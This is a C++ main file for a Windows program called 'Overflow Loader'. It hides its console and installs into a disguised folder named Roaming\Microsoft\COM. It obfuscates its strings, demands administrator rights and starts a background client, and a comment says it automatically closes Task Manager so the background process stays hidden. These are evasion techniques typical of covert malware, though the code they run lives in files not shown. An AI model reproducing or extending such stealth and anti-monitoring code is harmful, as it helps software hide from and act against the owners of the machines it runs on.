#include <Windows.h>
#include <thread>
#include <iostream>
#include <filesystem>

#include "gui\gui.h"
#include "client/client.h"
#include "utility\helper.h"
#include "utility/requests.h"
#include "utility\helper.h"
#include "client/functions.h"
#include "utility/task_manager.h"
#include "client/communication.h"

int main(int argc, char* argv[]) {
	/* Hide Console */
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	/* Set Path */
	client::PATH = helpers::roaming + xorstr_("\\Microsoft\\COM\\");

	/* Create Folder */
	std::filesystem::create_directory(helpers::roaming + "\\Microsoft\\COM");

	if (std::string(argv[0]).find("OverflowClient.exe") != std::string::npos) {
		/* Check If Elevated */
		if (!helpers::is_elevated()) {
			MessageBox(GetConsoleWindow(), xorstr_("Overflow Loader Must Be Ran As Admin"), xorstr_("Error"), MB_OK | MB_ICONQUESTION);
			return 0;
		}

		/* Create and Run Client */
		std::thread client;
		if (client::communication::get_profile("initialized") != "1" && !helpers::is_process_running(client::STARTUP_FILE_NAME.c_str())) {
			client = std::thread(client::init);
		}

		/* Start Menu */
		menu_init();

		/* Run Menu Loop */
		menu_loop();
	}
	else {
		/* Setup To Hide Our Background Client */
		// commented and replaced with
		// auto closing any task manager instances
		//hide_process(client::STARTUP_FILE_NAME);

		/* Background */
		client::background();
	}

	return 0;
}
